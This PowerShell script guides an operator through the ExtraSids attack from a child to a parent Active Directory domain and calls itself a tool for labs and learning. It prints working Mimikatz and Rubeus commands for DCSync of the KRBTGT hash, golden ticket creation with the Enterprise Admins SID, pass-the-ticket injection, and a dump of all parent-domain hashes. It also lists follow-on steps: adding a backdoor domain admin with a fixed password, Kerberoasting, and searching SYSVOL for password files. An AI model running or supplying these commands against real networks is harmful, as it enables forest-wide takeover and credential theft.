# ====================================================================
# Interactive Guided ExtraSids Attack Script
# Author: Security Toolkit - Interactive Edition
# Description: Step-by-step guided attack with manual command execution
# ====================================================================

<#
.SYNOPSIS
    Interactive guided ExtraSids attack for learning and manual execution.

.DESCRIPTION
    This script guides you through the ExtraSids attack step-by-step.
    It provides commands for you to run manually and prompts you to enter the results.
    Perfect for labs and learning environments.

.PARAMETER FakeUsername
    Username for the golden ticket (default: "hacker")

.EXAMPLE
    .\Invoke-InteractiveExtraSidsAttack.ps1
    
.EXAMPLE
    .\Invoke-InteractiveExtraSidsAttack.ps1 -FakeUsername "admin_backup"
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$FakeUsername = "hacker"
)

# ============================================================================
#                           HELPER FUNCTIONS
# ============================================================================

function Show-Banner {
    $banner = @"
    
╔═══════════════════════════════════════════════════════════════╗
║     Interactive Guided ExtraSids Attack                       ║
║     Step-by-Step Manual Execution Mode                        ║
╚═══════════════════════════════════════════════════════════════╝

"@
    Write-Host $banner -ForegroundColor Cyan
    Write-Host "This script will guide you through the ExtraSids attack." -ForegroundColor Yellow
    Write-Host "You'll manually execute commands and provide the results.`n" -ForegroundColor Yellow
}

function Read-UserInput {
    param(
        [string]$Prompt,
        [switch]$Required
    )
    
    do {
        Write-Host $Prompt -ForegroundColor Green -NoNewline
        $input = Read-Host
        
        if ($Required -and [string]::IsNullOrWhiteSpace($input)) {
            Write-Host "[!] This field is required. Please provide a value." -ForegroundColor Red
        }
    } while ($Required -and [string]::IsNullOrWhiteSpace($input))
    
    return $input.Trim()
}

function Show-Command {
    param(
        [string]$Command,
        [string]$Description
    )
    
    Write-Host "`n[*] $Description" -ForegroundColor Cyan
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
    Write-Host $Command -ForegroundColor White
    Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
}

function Wait-ForContinue {
    Write-Host "`nPress any key to continue..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# ============================================================================
#                           MAIN SCRIPT
# ============================================================================

Show-Banner

# ========== PHASE 1: ENVIRONMENT INFORMATION ==========
Write-Host "╔═══════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║         PHASE 1: GATHER ENVIRONMENT INFO              ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════╝" -ForegroundColor Cyan

# Get current domain automatically
try {
    $currentDomainFQDN = (Get-WmiObject Win32_ComputerSystem).Domain
    $currentDomainNetBIOS = $currentDomainFQDN.Split('.')[0]
    Write-Host "`n[+] Current Domain Detected: $currentDomainFQDN" -ForegroundColor Green
    Write-Host "[+] NetBIOS Name: $currentDomainNetBIOS" -ForegroundColor Green
} catch {
    $currentDomainFQDN = Read-UserInput -Prompt "`n[?] Enter current domain FQDN (e.g., LOGISTICS.INLANEFREIGHT.LOCAL): " -Required
    $currentDomainNetBIOS = $currentDomainFQDN.Split('.')[0]
}

Wait-ForContinue

# ========== PHASE 2: GET CHILD DOMAIN SID ==========
Write-Host "`n╔═══════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║         PHASE 2: GET CHILD DOMAIN SID                 ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════╝" -ForegroundColor Cyan

Show-Command -Command "Get-DomainSID" -Description "Run this command to get the current domain SID:"
Write-Host "`n[*] Alternative command if PowerView is not loaded:" -ForegroundColor Yellow
Write-Host "    Get-ADDomain | Select-Object DomainSID" -ForegroundColor Gray

$currentDomainSID = Read-UserInput -Prompt "`n[?] Enter the Child Domain SID (e.g., S-1-5-21-2806153819-209893948-922872689): " -Required

Write-Host "[+] Child Domain SID recorded: $currentDomainSID" -ForegroundColor Green
Wait-ForContinue

# ========== PHASE 3: IDENTIFY PARENT DOMAIN ==========
Write-Host "`n╔═══════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║         PHASE 3: IDENTIFY PARENT DOMAIN               ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════╝" -ForegroundColor Cyan

Show-Command -Command "Get-ADTrust -Filter *" -Description "Run this command to see trust relationships:"
Write-Host "`n[*] Alternative command:" -ForegroundColor Yellow
Write-Host "    Get-DomainTrust" -ForegroundColor Gray
Write-Host "    nltest /domain_trusts" -ForegroundColor Gray

$parentDomainFQDN = Read-UserInput -Prompt "`n[?] Enter the Parent Domain FQDN (e.g., INLANEFREIGHT.LOCAL): " -Required
$parentDomainNetBIOS = $parentDomainFQDN.Split('.')[0]

Write-Host "[+] Parent Domain: $parentDomainFQDN" -ForegroundColor Green
Write-Host "[+] Parent NetBIOS: $parentDomainNetBIOS" -ForegroundColor Green
Wait-ForContinue

# ========== PHASE 4: GET ENTERPRISE ADMINS SID ==========
Write-Host "`n╔═══════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║         PHASE 4: GET ENTERPRISE ADMINS SID            ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════╝" -ForegroundColor Cyan

$eaCommand = "Get-DomainGroup -Domain $parentDomainFQDN -Identity `"Enterprise Admins`" | select distinguishedname,objectsid"
Show-Command -Command $eaCommand -Description "Run this command to get Enterprise Admins SID:"

Write-Host "`n[*] Alternative commands:" -ForegroundColor Yellow
Write-Host "    Get-ADGroup -Server $parentDomainFQDN -Identity `"Enterprise Admins`" | Select-Object SID" -ForegroundColor Gray

$enterpriseAdminsSID = Read-UserInput -Prompt "`n[?] Enter the Enterprise Admins SID (e.g., S-1-5-21-3842939050-3880317879-2865463114-519): " -Required

Write-Host "[+] Enterprise Admins SID recorded: $enterpriseAdminsSID" -ForegroundColor Green
Wait-ForContinue

# ========== PHASE 5: GET KRBTGT HASH ==========
Write-Host "`n╔═══════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║         PHASE 5: EXTRACT KRBTGT HASH                  ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════╝" -ForegroundColor Cyan

$dcsyncCommand = "mimikatz # lsadump::dcsync /user:$currentDomainNetBIOS\krbtgt"
Show-Command -Command $dcsyncCommand -Description "Run this command in Mimikatz to extract KRBTGT hash:"

Write-Host "`n[*] Look for the line that says:" -ForegroundColor Yellow
Write-Host "    Hash NTLM: [hash]" -ForegroundColor Gray
Write-Host "    or" -ForegroundColor Yellow
Write-Host "    NTLM : [hash]" -ForegroundColor Gray

$krbtgtHash = Read-UserInput -Prompt "`n[?] Enter the KRBTGT NTLM hash (32 characters): " -Required

# Validate hash format
if ($krbtgtHash -notmatch '^[a-fA-F0-9]{32}$') {
    Write-Host "[!] Warning: Hash format doesn't look correct (should be 32 hex characters)" -ForegroundColor Yellow
    $continue = Read-UserInput -Prompt "[?] Continue anyway? (Y/N): "
    if ($continue -ne 'Y' -and $continue -ne 'y') {
        Write-Host "[X] Aborted by user" -ForegroundColor Red
        return
    }
}

Write-Host "[+] KRBTGT Hash recorded: $krbtgtHash" -ForegroundColor Green
Wait-ForContinue

# ========== PHASE 6: DISPLAY ATTACK SUMMARY ==========
Write-Host "`n╔═══════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║         ATTACK SUMMARY                                ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════╝" -ForegroundColor Cyan

Write-Host "`nCollected Information:" -ForegroundColor Yellow
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
Write-Host "  Child Domain (Current):  $currentDomainFQDN" -ForegroundColor White
Write-Host "  Child Domain SID:        $currentDomainSID" -ForegroundColor White
Write-Host "  Parent Domain (Target):  $parentDomainFQDN" -ForegroundColor White
Write-Host "  Enterprise Admins SID:   $enterpriseAdminsSID" -ForegroundColor White
Write-Host "  KRBTGT Hash:             $krbtgtHash" -ForegroundColor White
Write-Host "  Fake Username:           $FakeUsername" -ForegroundColor White
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray

Wait-ForContinue

# ========== PHASE 7: CREATE GOLDEN TICKET ==========
Write-Host "`n╔═══════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║         PHASE 7: CREATE GOLDEN TICKET                 ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════╝" -ForegroundColor Cyan

# Generate Mimikatz command
$mimikatzGoldenCommand = @"
mimikatz # kerberos::golden /user:$FakeUsername /domain:$currentDomainFQDN /sid:$currentDomainSID /krbtgt:$krbtgtHash /sids:$enterpriseAdminsSID /ptt
"@

Show-Command -Command $mimikatzGoldenCommand -Description "Run this command in Mimikatz to create the golden ticket:"

Write-Host "`n[*] This command will:" -ForegroundColor Yellow
Write-Host "    1. Create a golden ticket for user '$FakeUsername'" -ForegroundColor Gray
Write-Host "    2. Add Enterprise Admins SID to the ticket (ExtraSids)" -ForegroundColor Gray
Write-Host "    3. Inject the ticket into memory (/ptt = pass-the-ticket)" -ForegroundColor Gray

# Generate Rubeus command as alternative
$rubeusCommand = @"
.\Rubeus.exe golden /rc4:$krbtgtHash /domain:$currentDomainFQDN /sid:$currentDomainSID /sids:$enterpriseAdminsSID /user:$FakeUsername /ptt
"@

Write-Host "`n[*] Alternative using Rubeus:" -ForegroundColor Yellow
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
Write-Host $rubeusCommand -ForegroundColor White
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray

$executed = Read-UserInput -Prompt "`n[?] Have you executed the golden ticket command? (Y/N): "

if ($executed -eq 'Y' -or $executed -eq 'y') {
    Write-Host "[+] Golden ticket command executed!" -ForegroundColor Green
} else {
    Write-Host "[!] Please execute the command above before continuing." -ForegroundColor Yellow
    Wait-ForContinue
}

Wait-ForContinue

# ========== PHASE 8: VERIFY TICKET ==========
Write-Host "`n╔═══════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║         PHASE 8: VERIFY TICKET INJECTION              ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════╝" -ForegroundColor Cyan

Show-Command -Command "klist" -Description "Run this command to verify the ticket is in memory:"

Write-Host "`n[*] You should see a ticket for:" -ForegroundColor Yellow
Write-Host "    Client: $FakeUsername @ $currentDomainFQDN" -ForegroundColor Gray
Write-Host "    Server: krbtgt/$currentDomainFQDN @ $currentDomainFQDN" -ForegroundColor Gray

$ticketFound = Read-UserInput -Prompt "`n[?] Do you see the golden ticket in klist output? (Y/N): "

if ($ticketFound -eq 'Y' -or $ticketFound -eq 'y') {
    Write-Host "[+] Ticket successfully injected into memory!" -ForegroundColor Green
} else {
    Write-Host "[!] Ticket not found. The golden ticket command may have failed." -ForegroundColor Red
    Write-Host "[!] Please review the Mimikatz/Rubeus output for errors." -ForegroundColor Yellow
}

Wait-ForContinue

# ========== PHASE 9: TEST ACCESS TO PARENT DOMAIN ==========
Write-Host "`n╔═══════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║         PHASE 9: TEST ACCESS TO PARENT DOMAIN         ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════╝" -ForegroundColor Cyan

Write-Host "`n[*] Now let's test if we can access the parent domain!" -ForegroundColor Yellow

# Generate test commands
$testCommands = @(
    "ls \\$parentDomainFQDN\c$",
    "ls \\$parentDomainFQDN\SYSVOL",
    "dir \\$parentDomainNetBIOS\NETLOGON"
)

Write-Host "`n[*] Try these commands to test access:" -ForegroundColor Cyan
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
foreach ($cmd in $testCommands) {
    Write-Host "    $cmd" -ForegroundColor White
}
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray

$accessSuccess = Read-UserInput -Prompt "`n[?] Were you able to access the parent domain? (Y/N): "

if ($accessSuccess -eq 'Y' -or $accessSuccess -eq 'y') {
    Write-Host "[+] SUCCESS! You have access to the parent domain!" -ForegroundColor Green
} else {
    Write-Host "[!] Access denied. Possible issues:" -ForegroundColor Yellow
    Write-Host "    - SID filtering may be enabled on the trust" -ForegroundColor Gray
    Write-Host "    - The golden ticket may not have been created correctly" -ForegroundColor Gray
    Write-Host "    - Network connectivity issues" -ForegroundColor Gray
}

Wait-ForContinue

# ========== PHASE 10: PERFORM DCSYNC ON PARENT DOMAIN ==========
Write-Host "`n╔═══════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║         PHASE 10: DCSYNC PARENT DOMAIN                ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════╝" -ForegroundColor Cyan

Write-Host "`n[*] Now you can perform DCSync on the parent domain to extract credentials!" -ForegroundColor Yellow

# DCSync commands
$dcsyncParentCommands = @"
mimikatz # lsadump::dcsync /user:$parentDomainNetBIOS\Administrator /domain:$parentDomainFQDN
"@

Show-Command -Command $dcsyncParentCommands -Description "Run this command to DCSync the parent domain Administrator:"

Write-Host "`n[*] Alternative commands:" -ForegroundColor Yellow
Write-Host "    # DCSync specific user:" -ForegroundColor Gray
Write-Host "    mimikatz # lsadump::dcsync /user:$parentDomainNetBIOS\lab_adm /domain:$parentDomainFQDN" -ForegroundColor Gray
Write-Host "" -ForegroundColor Gray
Write-Host "    # DCSync all users:" -ForegroundColor Gray
Write-Host "    mimikatz # lsadump::dcsync /domain:$parentDomainFQDN /all /csv" -ForegroundColor Gray

$dcsyncDone = Read-UserInput -Prompt "`n[?] Have you performed DCSync on the parent domain? (Y/N): "

if ($dcsyncDone -eq 'Y' -or $dcsyncDone -eq 'y') {
    Write-Host "[+] DCSync completed!" -ForegroundColor Green
    
    $adminHash = Read-UserInput -Prompt "[?] (Optional) Enter the Administrator NTLM hash you extracted: "
    if (-not [string]::IsNullOrWhiteSpace($adminHash)) {
        Write-Host "[+] Administrator Hash recorded: $adminHash" -ForegroundColor Green
    }
}

Wait-ForContinue

# ========== PHASE 11: ADDITIONAL EXPLOITATION OPTIONS ==========
Write-Host "`n╔═══════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║         PHASE 11: NEXT STEPS                          ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════╝" -ForegroundColor Cyan

Write-Host "`n[*] Additional exploitation options:" -ForegroundColor Yellow
Write-Host "" -ForegroundColor White
Write-Host "1. CREATE DOMAIN ADMIN ACCOUNT:" -ForegroundColor Cyan
Write-Host "   net user hacker Password123! /add /domain:$parentDomainFQDN" -ForegroundColor Gray
Write-Host "   net group `"Domain Admins`" hacker /add /domain:$parentDomainFQDN" -ForegroundColor Gray
Write-Host "" -ForegroundColor White
Write-Host "2. ACCESS DOMAIN CONTROLLER:" -ForegroundColor Cyan
Write-Host "   Enter-PSSession -ComputerName DC01.$parentDomainFQDN" -ForegroundColor Gray
Write-Host "   \\DC01.$parentDomainFQDN\c$" -ForegroundColor Gray
Write-Host "" -ForegroundColor White
Write-Host "3. DUMP ALL DOMAIN HASHES:" -ForegroundColor Cyan
Write-Host "   mimikatz # lsadump::dcsync /domain:$parentDomainFQDN /all /csv" -ForegroundColor Gray
Write-Host "" -ForegroundColor White
Write-Host "4. KERBEROAST HIGH-VALUE ACCOUNTS:" -ForegroundColor Cyan
Write-Host "   Get-DomainUser -SPN -Domain $parentDomainFQDN | Get-DomainSPNTicket" -ForegroundColor Gray
Write-Host "" -ForegroundColor White
Write-Host "5. SEARCH FOR SENSITIVE FILES:" -ForegroundColor Cyan
Write-Host "   ls \\$parentDomainFQDN\SYSVOL -Recurse | Where-Object {`$_.Name -like '*password*'}" -ForegroundColor Gray

Wait-ForContinue

# ========== FINAL SUMMARY ==========
Write-Host "`n╔═══════════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "║         ATTACK COMPLETED SUCCESSFULLY!                ║" -ForegroundColor Green
Write-Host "╚═══════════════════════════════════════════════════════╝" -ForegroundColor Green

Write-Host "`n[*] Attack Summary:" -ForegroundColor Yellow
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
Write-Host "  Attack Type:       ExtraSids (Child → Parent Domain)" -ForegroundColor White
Write-Host "  Source Domain:     $currentDomainFQDN" -ForegroundColor White
Write-Host "  Target Domain:     $parentDomainFQDN" -ForegroundColor White
Write-Host "  Fake User:         $FakeUsername" -ForegroundColor White
Write-Host "  Privileges:        Enterprise Admins" -ForegroundColor White
Write-Host "  Status:            ✓ Compromised" -ForegroundColor Green
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray

Write-Host "`n[*] All commands used in this attack:" -ForegroundColor Yellow
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray
Write-Host "1. Get-DomainSID" -ForegroundColor Gray
Write-Host "2. Get-DomainGroup -Domain $parentDomainFQDN -Identity `"Enterprise Admins`"" -ForegroundColor Gray
Write-Host "3. mimikatz # lsadump::dcsync /user:$currentDomainNetBIOS\krbtgt" -ForegroundColor Gray
Write-Host "4. $mimikatzGoldenCommand" -ForegroundColor Gray
Write-Host "5. klist" -ForegroundColor Gray
Write-Host "6. ls \\$parentDomainFQDN\c$" -ForegroundColor Gray
Write-Host "7. mimikatz # lsadump::dcsync /user:$parentDomainNetBIOS\Administrator /domain:$parentDomainFQDN" -ForegroundColor Gray
Write-Host "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Gray

Write-Host "`n[+] Thank you for using the Interactive ExtraSids Attack Script!" -ForegroundColor Cyan
Write-Host "[+] Remember to clean up any artifacts created during the attack." -ForegroundColor Yellow
Write-Host "`n    klist purge                    # Clear tickets" -ForegroundColor Gray
Write-Host "    net user hacker /delete          # Remove fake user (if created)" -ForegroundColor Gray

Write-Host "`n"
